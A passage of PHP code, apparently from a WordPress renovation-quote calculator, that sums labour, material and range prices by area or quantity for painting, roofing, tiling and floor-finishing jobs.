                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }
					
			$coating = $data['coating'];
			$coats_total = 1;
			foreach($coats_data as $temp) {
					if($temp['title'] == $coating) {

							// let's count QNT of each coating field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$coats_count = $data['' . $count_field_title . ''];
							if($coats_count == NULL || $coats_count == '' || empty($coats_count)) {
								   $coats_count = 1;
							}
              if($coats_count == 2) {$coats_count = 1.4;}
              elseif($coats_count == 3) {$coats_count = 2;}
              elseif($coats_count == 4) {$coats_count = 2.3;}
              elseif($coats_count == 5) {$coats_count = 2.6;}
              elseif($coats_count == 6) {$coats_count = 2.9;}
              elseif($coats_count == 7) {$coats_count = 3.2;}
            
              $coats_total = $coats_total * $coats_count;
					}
 
			}
		
                                $coating_total = ($new_walls_total + $new_ceiling_total) * $coats_total;
					                      $painting_total = $coating_total + $current_walls_total + $wall_prep_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $trim_total;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply;

                                $total = $total + $paint_room_total;


                }
	
	
  // formulas for Roof painting
        if(get_the_title($t) == 'Roof Painting') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];

                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'type') {
                                                $type_title = $d['title'];
                                                $type_prices = $d['type_of_price'];
                                                $type_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'prep') {
                                                $prep_title = $d['title'];
                                                $prep_prices = $d['type_of_price'];
                                                $prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'scaffolding') {
                                                $scaffolding_title = $d['title'];
                                                $scaffolding_prices = $d['type_of_price'];
                                                $scaffolding_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'supply') {
                                                $supply_title = $d['title'];
                                                $supply_prices = $d['type_of_price'];
                                                $supply_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                           					}


                                $roof_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $type = $data['type'];
                $type_total = 0;
                foreach($type_data as $temp) {
                        if( $temp['title'] == $type ) {


                                if($type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_total = $type_total +  ($labour_and_material_total * $roof_area);
                                }
                                elseif($type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_total = $type_total + ($range_price_total * $roof_area);
                                }

                        }

                }

                $prep = $data['prep'];
                $prep_total = 0;
                foreach($prep_data as $temp) {
                        if(in_array($temp['title'],$prep) ) {


                                if($prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $prep_total = $prep_total +  ( $labour_and_material_total * $roof_area);
                                }
                                elseif($prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $prep_total = $prep_total + ( $range_price_total * $roof_area);
                                }

                        }

                }


                $scaffolding = $data['scaffolding'];
                $scaffolding_total = 0;
                foreach($scaffolding_data as $temp) {
                        if($temp['title'] == $scaffolding) {


                                if($scaffolding_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$scaffolding_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $scaffolding_total = $scaffolding_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($scaffolding_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $scaffolding_total = $scaffolding_total + ( $range_price_total * $outer_length);
                                }

                        }

                }

	              $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {


                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }

                $supply = $data['supply'];
                $supply_total = 0;
                foreach($supply_data as $temp) {
                        if( $temp['title'] == $supply ) {


                                if($supply_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$supply_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $supply_total = $supply_total + $labour_and_material_total ;
                                }
                                elseif($supply_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $supply_total = $supply_total + $range_price_total;
                                }

                        }

                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }


	                              $painting_total = $type_total + $trim_total;
                                $paint_supply = $painting_total * $supply_total / 100;
					                      $paint_roof_total = $painting_total + $paint_supply + $extras_total + $prep_total + $scaffolding_total;

                                $total = $total + $paint_roof_total;


                }

	

	// formulas for wall tiling
	if(get_the_title($t) == 'Wall Tiles') {

							   $all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $height = $data['area_height'];
										   $supply_area = $data['supply_area'];
										   $supply_price = $data['supply_price'];
							foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			  $wall_area = $width * $height;
			$supply_total = $supply_area * $supply_price;
				
					  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $wall_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $wall_area);
							}

					}

			}


			  $proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $wall_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $wall_area);
							}

					}

			}

			  $extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

							  $walls_total = $current_total + $proposed_total;
									  $tile_wall_total = $walls_total + $extras_total + $supply_total;

							$total = $total + $tile_wall_total;


			}

	// formulas for wall tiling
	if(get_the_title($t) == 'Floor Tiles') {

							$all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
										   $supply_area = $data['supply_area'];
										   $supply_price = $data['supply_price'];
							foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			  $floor_area = $width * $length;
			$supply_total = $supply_area * $supply_price;
				
					  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			  $proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			  $extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

							$floor_total = $current_total + $proposed_total;
						  $tile_floor_total = $floor_total + $extras_total + $supply_total;

							$total = $total + $tile_floor_total;


			} 

   // formulas for floor painting
	if(get_the_title($t) == 'Floor Painting') {

							$all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
										   $supply_area = $data['supply_area'];
										   $supply_price = $data['supply_price'];
							foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			  $floor_area = $width * $length;
				
					  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			  $proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			  $extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

							  $floor_total = $current_total + $proposed_total;
							  $tile_floor_total = $floor_total + $extras_total;

							$total = $total + $tile_floor_total;


			} 
	
  
  // formulas for floor Sanding
	if(htmlspecialchars_decode( get_the_title($t) ) == 'Sand & Polish') {

							$all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
								 $supply_area = $data['supply_area'];
								 $supply_price = $data['supply_price'];
                 $demolition = $data['demolition'];
							
          foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			$floor_area = $width * $length;
				
		  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ( $range_price_total * $floor_area);
							}

					}

			}


			$proposed = $data['proposed'];
			$proposed_total = 0;
			foreach($proposed_data as $temp) {
					if( $temp['title'] == $proposed ) {


							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_total = $proposed_total + ( $range_price_total * $floor_area);
							}

					}

			}

			$extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extras field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}
    
    if($demolition != 'Yes') {
				$current_total = 0;
		}
		else {
				$current_total = $current_total;
		}

							  $floor_total = $current_total + $proposed_total;
								$tile_floor_total = $floor_total + $extras_total;

							$total = $total + $tile_floor_total;


			} 

  // formulas for floor Sanding
	if(htmlspecialchars_decode( get_the_title($t) ) == 'White & Limewash') {

							$all_scope_data = get_field('quote_fields',$t);

								 $width = $data['area_width'];
								 $length = $data['area_length'];
								 $supply_area = $data['supply_area'];
								 $supply_price = $data['supply_price'];
                 $demolition = $data['demolition'];
							
          foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'proposed') {
											$proposed_title = $d['title'];
											$proposed_prices = $d['type_of_price'];
											$proposed_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
								 }

				
			$floor_area = $width * $length;
				
		  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current ) {


							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
